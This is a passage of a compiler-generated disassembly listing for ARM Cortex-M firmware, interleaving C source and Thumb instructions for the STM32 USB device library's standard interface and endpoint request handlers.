 800b6ba:	f000 fd0d 	bl	800c0d8 <USBD_SetFeature>
          break;
 800b6be:	e009      	b.n	800b6d4 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b6c0:	6839      	ldr	r1, [r7, #0]
 800b6c2:	6878      	ldr	r0, [r7, #4]
 800b6c4:	f000 fd31 	bl	800c12a <USBD_ClrFeature>
          break;
 800b6c8:	e004      	b.n	800b6d4 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b6ca:	6839      	ldr	r1, [r7, #0]
 800b6cc:	6878      	ldr	r0, [r7, #4]
 800b6ce:	f000 fd88 	bl	800c1e2 <USBD_CtlError>
          break;
 800b6d2:	bf00      	nop
      }
      break;
 800b6d4:	e004      	b.n	800b6e0 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b6d6:	6839      	ldr	r1, [r7, #0]
 800b6d8:	6878      	ldr	r0, [r7, #4]
 800b6da:	f000 fd82 	bl	800c1e2 <USBD_CtlError>
      break;
 800b6de:	bf00      	nop
  }

  return ret;
 800b6e0:	7bfb      	ldrb	r3, [r7, #15]
}
 800b6e2:	4618      	mov	r0, r3
 800b6e4:	3710      	adds	r7, #16
 800b6e6:	46bd      	mov	sp, r7
 800b6e8:	bd80      	pop	{r7, pc}
 800b6ea:	bf00      	nop

0800b6ec <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b6ec:	b580      	push	{r7, lr}
 800b6ee:	b084      	sub	sp, #16
 800b6f0:	af00      	add	r7, sp, #0
 800b6f2:	6078      	str	r0, [r7, #4]
 800b6f4:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b6f6:	2300      	movs	r3, #0
 800b6f8:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b6fa:	683b      	ldr	r3, [r7, #0]
 800b6fc:	781b      	ldrb	r3, [r3, #0]
 800b6fe:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b702:	2b40      	cmp	r3, #64	; 0x40
 800b704:	d005      	beq.n	800b712 <USBD_StdItfReq+0x26>
 800b706:	2b40      	cmp	r3, #64	; 0x40
 800b708:	d852      	bhi.n	800b7b0 <USBD_StdItfReq+0xc4>
 800b70a:	2b00      	cmp	r3, #0
 800b70c:	d001      	beq.n	800b712 <USBD_StdItfReq+0x26>
 800b70e:	2b20      	cmp	r3, #32
 800b710:	d14e      	bne.n	800b7b0 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b712:	687b      	ldr	r3, [r7, #4]
 800b714:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b718:	b2db      	uxtb	r3, r3
 800b71a:	3b01      	subs	r3, #1
 800b71c:	2b02      	cmp	r3, #2
 800b71e:	d840      	bhi.n	800b7a2 <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b720:	683b      	ldr	r3, [r7, #0]
 800b722:	889b      	ldrh	r3, [r3, #4]
 800b724:	b2db      	uxtb	r3, r3
 800b726:	2b01      	cmp	r3, #1
 800b728:	d836      	bhi.n	800b798 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b72a:	683b      	ldr	r3, [r7, #0]
 800b72c:	889b      	ldrh	r3, [r3, #4]
 800b72e:	b2db      	uxtb	r3, r3
 800b730:	4619      	mov	r1, r3
 800b732:	6878      	ldr	r0, [r7, #4]
 800b734:	f7ff fed8 	bl	800b4e8 <USBD_CoreFindIF>
 800b738:	4603      	mov	r3, r0
 800b73a:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b73c:	7bbb      	ldrb	r3, [r7, #14]
 800b73e:	2bff      	cmp	r3, #255	; 0xff
 800b740:	d01d      	beq.n	800b77e <USBD_StdItfReq+0x92>
 800b742:	7bbb      	ldrb	r3, [r7, #14]
 800b744:	2b00      	cmp	r3, #0
 800b746:	d11a      	bne.n	800b77e <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b748:	7bba      	ldrb	r2, [r7, #14]
 800b74a:	687b      	ldr	r3, [r7, #4]
 800b74c:	32ae      	adds	r2, #174	; 0xae
 800b74e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b752:	689b      	ldr	r3, [r3, #8]
 800b754:	2b00      	cmp	r3, #0
 800b756:	d00f      	beq.n	800b778 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b758:	7bba      	ldrb	r2, [r7, #14]
 800b75a:	687b      	ldr	r3, [r7, #4]
 800b75c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b760:	7bba      	ldrb	r2, [r7, #14]
 800b762:	687b      	ldr	r3, [r7, #4]
 800b764:	32ae      	adds	r2, #174	; 0xae
 800b766:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b76a:	689b      	ldr	r3, [r3, #8]
 800b76c:	6839      	ldr	r1, [r7, #0]
 800b76e:	6878      	ldr	r0, [r7, #4]
 800b770:	4798      	blx	r3
 800b772:	4603      	mov	r3, r0
 800b774:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b776:	e004      	b.n	800b782 <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b778:	2303      	movs	r3, #3
 800b77a:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b77c:	e001      	b.n	800b782 <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b77e:	2303      	movs	r3, #3
 800b780:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b782:	683b      	ldr	r3, [r7, #0]
 800b784:	88db      	ldrh	r3, [r3, #6]
 800b786:	2b00      	cmp	r3, #0
 800b788:	d110      	bne.n	800b7ac <USBD_StdItfReq+0xc0>
 800b78a:	7bfb      	ldrb	r3, [r7, #15]
 800b78c:	2b00      	cmp	r3, #0
 800b78e:	d10d      	bne.n	800b7ac <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b790:	6878      	ldr	r0, [r7, #4]
 800b792:	f000 fdf1 	bl	800c378 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b796:	e009      	b.n	800b7ac <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b798:	6839      	ldr	r1, [r7, #0]
 800b79a:	6878      	ldr	r0, [r7, #4]
 800b79c:	f000 fd21 	bl	800c1e2 <USBD_CtlError>
          break;
 800b7a0:	e004      	b.n	800b7ac <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b7a2:	6839      	ldr	r1, [r7, #0]
 800b7a4:	6878      	ldr	r0, [r7, #4]
 800b7a6:	f000 fd1c 	bl	800c1e2 <USBD_CtlError>
          break;
 800b7aa:	e000      	b.n	800b7ae <USBD_StdItfReq+0xc2>
          break;
 800b7ac:	bf00      	nop
      }
      break;
 800b7ae:	e004      	b.n	800b7ba <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b7b0:	6839      	ldr	r1, [r7, #0]
 800b7b2:	6878      	ldr	r0, [r7, #4]
 800b7b4:	f000 fd15 	bl	800c1e2 <USBD_CtlError>
      break;
 800b7b8:	bf00      	nop
  }

  return ret;
 800b7ba:	7bfb      	ldrb	r3, [r7, #15]
}
 800b7bc:	4618      	mov	r0, r3
 800b7be:	3710      	adds	r7, #16
 800b7c0:	46bd      	mov	sp, r7
 800b7c2:	bd80      	pop	{r7, pc}

0800b7c4 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b7c4:	b580      	push	{r7, lr}
 800b7c6:	b084      	sub	sp, #16
 800b7c8:	af00      	add	r7, sp, #0
 800b7ca:	6078      	str	r0, [r7, #4]
 800b7cc:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b7ce:	2300      	movs	r3, #0
 800b7d0:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b7d2:	683b      	ldr	r3, [r7, #0]
 800b7d4:	889b      	ldrh	r3, [r3, #4]
 800b7d6:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b7d8:	683b      	ldr	r3, [r7, #0]
 800b7da:	781b      	ldrb	r3, [r3, #0]
 800b7dc:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b7e0:	2b40      	cmp	r3, #64	; 0x40
 800b7e2:	d007      	beq.n	800b7f4 <USBD_StdEPReq+0x30>
 800b7e4:	2b40      	cmp	r3, #64	; 0x40
 800b7e6:	f200 817f 	bhi.w	800bae8 <USBD_StdEPReq+0x324>
 800b7ea:	2b00      	cmp	r3, #0
 800b7ec:	d02a      	beq.n	800b844 <USBD_StdEPReq+0x80>
 800b7ee:	2b20      	cmp	r3, #32
 800b7f0:	f040 817a 	bne.w	800bae8 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b7f4:	7bbb      	ldrb	r3, [r7, #14]
 800b7f6:	4619      	mov	r1, r3
 800b7f8:	6878      	ldr	r0, [r7, #4]
 800b7fa:	f7ff fe82 	bl	800b502 <USBD_CoreFindEP>
 800b7fe:	4603      	mov	r3, r0
 800b800:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b802:	7b7b      	ldrb	r3, [r7, #13]
 800b804:	2bff      	cmp	r3, #255	; 0xff
 800b806:	f000 8174 	beq.w	800baf2 <USBD_StdEPReq+0x32e>
 800b80a:	7b7b      	ldrb	r3, [r7, #13]
 800b80c:	2b00      	cmp	r3, #0
 800b80e:	f040 8170 	bne.w	800baf2 <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b812:	7b7a      	ldrb	r2, [r7, #13]
 800b814:	687b      	ldr	r3, [r7, #4]
 800b816:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b81a:	7b7a      	ldrb	r2, [r7, #13]
 800b81c:	687b      	ldr	r3, [r7, #4]
 800b81e:	32ae      	adds	r2, #174	; 0xae
 800b820:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b824:	689b      	ldr	r3, [r3, #8]
 800b826:	2b00      	cmp	r3, #0
 800b828:	f000 8163 	beq.w	800baf2 <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b82c:	7b7a      	ldrb	r2, [r7, #13]
 800b82e:	687b      	ldr	r3, [r7, #4]
 800b830:	32ae      	adds	r2, #174	; 0xae
 800b832:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b836:	689b      	ldr	r3, [r3, #8]
 800b838:	6839      	ldr	r1, [r7, #0]
 800b83a:	6878      	ldr	r0, [r7, #4]
 800b83c:	4798      	blx	r3
 800b83e:	4603      	mov	r3, r0
 800b840:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b842:	e156      	b.n	800baf2 <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b844:	683b      	ldr	r3, [r7, #0]
 800b846:	785b      	ldrb	r3, [r3, #1]
 800b848:	2b03      	cmp	r3, #3
 800b84a:	d008      	beq.n	800b85e <USBD_StdEPReq+0x9a>
 800b84c:	2b03      	cmp	r3, #3
 800b84e:	f300 8145 	bgt.w	800badc <USBD_StdEPReq+0x318>
 800b852:	2b00      	cmp	r3, #0
 800b854:	f000 809b 	beq.w	800b98e <USBD_StdEPReq+0x1ca>
 800b858:	2b01      	cmp	r3, #1
 800b85a:	d03c      	beq.n	800b8d6 <USBD_StdEPReq+0x112>
 800b85c:	e13e      	b.n	800badc <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b85e:	687b      	ldr	r3, [r7, #4]
 800b860:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b864:	b2db      	uxtb	r3, r3
 800b866:	2b02      	cmp	r3, #2
 800b868:	d002      	beq.n	800b870 <USBD_StdEPReq+0xac>
 800b86a:	2b03      	cmp	r3, #3
 800b86c:	d016      	beq.n	800b89c <USBD_StdEPReq+0xd8>
 800b86e:	e02c      	b.n	800b8ca <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b870:	7bbb      	ldrb	r3, [r7, #14]
 800b872:	2b00      	cmp	r3, #0
 800b874:	d00d      	beq.n	800b892 <USBD_StdEPReq+0xce>
 800b876:	7bbb      	ldrb	r3, [r7, #14]
 800b878:	2b80      	cmp	r3, #128	; 0x80
 800b87a:	d00a      	beq.n	800b892 <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b87c:	7bbb      	ldrb	r3, [r7, #14]
 800b87e:	4619      	mov	r1, r3
 800b880:	6878      	ldr	r0, [r7, #4]
 800b882:	f001 fa21 	bl	800ccc8 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b886:	2180      	movs	r1, #128	; 0x80
 800b888:	6878      	ldr	r0, [r7, #4]
 800b88a:	f001 fa1d 	bl	800ccc8 <USBD_LL_StallEP>
 800b88e:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b890:	e020      	b.n	800b8d4 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b892:	6839      	ldr	r1, [r7, #0]
 800b894:	6878      	ldr	r0, [r7, #4]
 800b896:	f000 fca4 	bl	800c1e2 <USBD_CtlError>
              break;
 800b89a:	e01b      	b.n	800b8d4 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b89c:	683b      	ldr	r3, [r7, #0]
 800b89e:	885b      	ldrh	r3, [r3, #2]
 800b8a0:	2b00      	cmp	r3, #0
 800b8a2:	d10e      	bne.n	800b8c2 <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800b8a4:	7bbb      	ldrb	r3, [r7, #14]
 800b8a6:	2b00      	cmp	r3, #0
 800b8a8:	d00b      	beq.n	800b8c2 <USBD_StdEPReq+0xfe>
 800b8aa:	7bbb      	ldrb	r3, [r7, #14]
 800b8ac:	2b80      	cmp	r3, #128	; 0x80
 800b8ae:	d008      	beq.n	800b8c2 <USBD_StdEPReq+0xfe>
 800b8b0:	683b      	ldr	r3, [r7, #0]
 800b8b2:	88db      	ldrh	r3, [r3, #6]
 800b8b4:	2b00      	cmp	r3, #0
 800b8b6:	d104      	bne.n	800b8c2 <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800b8b8:	7bbb      	ldrb	r3, [r7, #14]
 800b8ba:	4619      	mov	r1, r3
 800b8bc:	6878      	ldr	r0, [r7, #4]
 800b8be:	f001 fa03 	bl	800ccc8 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800b8c2:	6878      	ldr	r0, [r7, #4]
 800b8c4:	f000 fd58 	bl	800c378 <USBD_CtlSendStatus>

              break;
 800b8c8:	e004      	b.n	800b8d4 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800b8ca:	6839      	ldr	r1, [r7, #0]
 800b8cc:	6878      	ldr	r0, [r7, #4]
 800b8ce:	f000 fc88 	bl	800c1e2 <USBD_CtlError>
              break;
 800b8d2:	bf00      	nop
          }
          break;
 800b8d4:	e107      	b.n	800bae6 <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800b8d6:	687b      	ldr	r3, [r7, #4]
 800b8d8:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b8dc:	b2db      	uxtb	r3, r3
 800b8de:	2b02      	cmp	r3, #2
 800b8e0:	d002      	beq.n	800b8e8 <USBD_StdEPReq+0x124>
 800b8e2:	2b03      	cmp	r3, #3
 800b8e4:	d016      	beq.n	800b914 <USBD_StdEPReq+0x150>
 800b8e6:	e04b      	b.n	800b980 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b8e8:	7bbb      	ldrb	r3, [r7, #14]
 800b8ea:	2b00      	cmp	r3, #0
 800b8ec:	d00d      	beq.n	800b90a <USBD_StdEPReq+0x146>
 800b8ee:	7bbb      	ldrb	r3, [r7, #14]
 800b8f0:	2b80      	cmp	r3, #128	; 0x80
 800b8f2:	d00a      	beq.n	800b90a <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b8f4:	7bbb      	ldrb	r3, [r7, #14]
 800b8f6:	4619      	mov	r1, r3
 800b8f8:	6878      	ldr	r0, [r7, #4]
 800b8fa:	f001 f9e5 	bl	800ccc8 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b8fe:	2180      	movs	r1, #128	; 0x80
 800b900:	6878      	ldr	r0, [r7, #4]
 800b902:	f001 f9e1 	bl	800ccc8 <USBD_LL_StallEP>
 800b906:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b908:	e040      	b.n	800b98c <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800b90a:	6839      	ldr	r1, [r7, #0]
 800b90c:	6878      	ldr	r0, [r7, #4]
 800b90e:	f000 fc68 	bl	800c1e2 <USBD_CtlError>
              break;
 800b912:	e03b      	b.n	800b98c <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b914:	683b      	ldr	r3, [r7, #0]
 800b916:	885b      	ldrh	r3, [r3, #2]
 800b918:	2b00      	cmp	r3, #0
 800b91a:	d136      	bne.n	800b98a <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800b91c:	7bbb      	ldrb	r3, [r7, #14]
 800b91e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b922:	2b00      	cmp	r3, #0
 800b924:	d004      	beq.n	800b930 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800b926:	7bbb      	ldrb	r3, [r7, #14]
 800b928:	4619      	mov	r1, r3
 800b92a:	6878      	ldr	r0, [r7, #4]
 800b92c:	f001 fa02 	bl	800cd34 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800b930:	6878      	ldr	r0, [r7, #4]
 800b932:	f000 fd21 	bl	800c378 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800b936:	7bbb      	ldrb	r3, [r7, #14]
 800b938:	4619      	mov	r1, r3
 800b93a:	6878      	ldr	r0, [r7, #4]
 800b93c:	f7ff fde1 	bl	800b502 <USBD_CoreFindEP>
 800b940:	4603      	mov	r3, r0
 800b942:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b944:	7b7b      	ldrb	r3, [r7, #13]
 800b946:	2bff      	cmp	r3, #255	; 0xff
 800b948:	d01f      	beq.n	800b98a <USBD_StdEPReq+0x1c6>
 800b94a:	7b7b      	ldrb	r3, [r7, #13]
 800b94c:	2b00      	cmp	r3, #0
 800b94e:	d11c      	bne.n	800b98a <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800b950:	7b7a      	ldrb	r2, [r7, #13]
 800b952:	687b      	ldr	r3, [r7, #4]
 800b954:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800b958:	7b7a      	ldrb	r2, [r7, #13]
 800b95a:	687b      	ldr	r3, [r7, #4]
 800b95c:	32ae      	adds	r2, #174	; 0xae
 800b95e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b962:	689b      	ldr	r3, [r3, #8]
 800b964:	2b00      	cmp	r3, #0
 800b966:	d010      	beq.n	800b98a <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b968:	7b7a      	ldrb	r2, [r7, #13]
 800b96a:	687b      	ldr	r3, [r7, #4]
 800b96c:	32ae      	adds	r2, #174	; 0xae
 800b96e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b972:	689b      	ldr	r3, [r3, #8]
 800b974:	6839      	ldr	r1, [r7, #0]
 800b976:	6878      	ldr	r0, [r7, #4]
 800b978:	4798      	blx	r3
 800b97a:	4603      	mov	r3, r0
 800b97c:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800b97e:	e004      	b.n	800b98a <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800b980:	6839      	ldr	r1, [r7, #0]
 800b982:	6878      	ldr	r0, [r7, #4]
 800b984:	f000 fc2d 	bl	800c1e2 <USBD_CtlError>
              break;
 800b988:	e000      	b.n	800b98c <USBD_StdEPReq+0x1c8>
              break;
 800b98a:	bf00      	nop
          }
          break;
 800b98c:	e0ab      	b.n	800bae6 <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800b98e:	687b      	ldr	r3, [r7, #4]
 800b990:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b994:	b2db      	uxtb	r3, r3
 800b996:	2b02      	cmp	r3, #2
 800b998:	d002      	beq.n	800b9a0 <USBD_StdEPReq+0x1dc>
 800b99a:	2b03      	cmp	r3, #3
 800b99c:	d032      	beq.n	800ba04 <USBD_StdEPReq+0x240>
 800b99e:	e097      	b.n	800bad0 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b9a0:	7bbb      	ldrb	r3, [r7, #14]
 800b9a2:	2b00      	cmp	r3, #0
 800b9a4:	d007      	beq.n	800b9b6 <USBD_StdEPReq+0x1f2>
 800b9a6:	7bbb      	ldrb	r3, [r7, #14]
 800b9a8:	2b80      	cmp	r3, #128	; 0x80
 800b9aa:	d004      	beq.n	800b9b6 <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800b9ac:	6839      	ldr	r1, [r7, #0]
 800b9ae:	6878      	ldr	r0, [r7, #4]
 800b9b0:	f000 fc17 	bl	800c1e2 <USBD_CtlError>
                break;
 800b9b4:	e091      	b.n	800bada <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9b6:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9ba:	2b00      	cmp	r3, #0
 800b9bc:	da0b      	bge.n	800b9d6 <USBD_StdEPReq+0x212>
 800b9be:	7bbb      	ldrb	r3, [r7, #14]
 800b9c0:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b9c4:	4613      	mov	r3, r2
 800b9c6:	009b      	lsls	r3, r3, #2
 800b9c8:	4413      	add	r3, r2
 800b9ca:	009b      	lsls	r3, r3, #2
 800b9cc:	3310      	adds	r3, #16
 800b9ce:	687a      	ldr	r2, [r7, #4]
 800b9d0:	4413      	add	r3, r2
 800b9d2:	3304      	adds	r3, #4
 800b9d4:	e00b      	b.n	800b9ee <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b9d6:	7bbb      	ldrb	r3, [r7, #14]
 800b9d8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9dc:	4613      	mov	r3, r2
 800b9de:	009b      	lsls	r3, r3, #2
 800b9e0:	4413      	add	r3, r2
 800b9e2:	009b      	lsls	r3, r3, #2
 800b9e4:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b9e8:	687a      	ldr	r2, [r7, #4]
 800b9ea:	4413      	add	r3, r2
 800b9ec:	3304      	adds	r3, #4
 800b9ee:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800b9f0:	68bb      	ldr	r3, [r7, #8]
 800b9f2:	2200      	movs	r2, #0
 800b9f4:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b9f6:	68bb      	ldr	r3, [r7, #8]
 800b9f8:	2202      	movs	r2, #2
 800b9fa:	4619      	mov	r1, r3
 800b9fc:	6878      	ldr	r0, [r7, #4]
 800b9fe:	f000 fc61 	bl	800c2c4 <USBD_CtlSendData>
              break;
 800ba02:	e06a      	b.n	800bada <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800ba04:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800ba08:	2b00      	cmp	r3, #0
 800ba0a:	da11      	bge.n	800ba30 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800ba0c:	7bbb      	ldrb	r3, [r7, #14]
 800ba0e:	f003 020f 	and.w	r2, r3, #15
 800ba12:	6879      	ldr	r1, [r7, #4]
 800ba14:	4613      	mov	r3, r2
 800ba16:	009b      	lsls	r3, r3, #2
 800ba18:	4413      	add	r3, r2
 800ba1a:	009b      	lsls	r3, r3, #2
 800ba1c:	440b      	add	r3, r1
 800ba1e:	3324      	adds	r3, #36	; 0x24
 800ba20:	881b      	ldrh	r3, [r3, #0]
 800ba22:	2b00      	cmp	r3, #0
 800ba24:	d117      	bne.n	800ba56 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800ba26:	6839      	ldr	r1, [r7, #0]
 800ba28:	6878      	ldr	r0, [r7, #4]
 800ba2a:	f000 fbda 	bl	800c1e2 <USBD_CtlError>
                  break;
 800ba2e:	e054      	b.n	800bada <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800ba30:	7bbb      	ldrb	r3, [r7, #14]
 800ba32:	f003 020f 	and.w	r2, r3, #15
 800ba36:	6879      	ldr	r1, [r7, #4]
 800ba38:	4613      	mov	r3, r2
 800ba3a:	009b      	lsls	r3, r3, #2
 800ba3c:	4413      	add	r3, r2
 800ba3e:	009b      	lsls	r3, r3, #2
 800ba40:	440b      	add	r3, r1
 800ba42:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800ba46:	881b      	ldrh	r3, [r3, #0]
 800ba48:	2b00      	cmp	r3, #0
 800ba4a:	d104      	bne.n	800ba56 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800ba4c:	6839      	ldr	r1, [r7, #0]
 800ba4e:	6878      	ldr	r0, [r7, #4]
 800ba50:	f000 fbc7 	bl	800c1e2 <USBD_CtlError>
                  break;
 800ba54:	e041      	b.n	800bada <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800ba56:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800ba5a:	2b00      	cmp	r3, #0
 800ba5c:	da0b      	bge.n	800ba76 <USBD_StdEPReq+0x2b2>
 800ba5e:	7bbb      	ldrb	r3, [r7, #14]
 800ba60:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800ba64:	4613      	mov	r3, r2
 800ba66:	009b      	lsls	r3, r3, #2
 800ba68:	4413      	add	r3, r2
 800ba6a:	009b      	lsls	r3, r3, #2
 800ba6c:	3310      	adds	r3, #16
 800ba6e:	687a      	ldr	r2, [r7, #4]
 800ba70:	4413      	add	r3, r2
 800ba72:	3304      	adds	r3, #4
 800ba74:	e00b      	b.n	800ba8e <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800ba76:	7bbb      	ldrb	r3, [r7, #14]
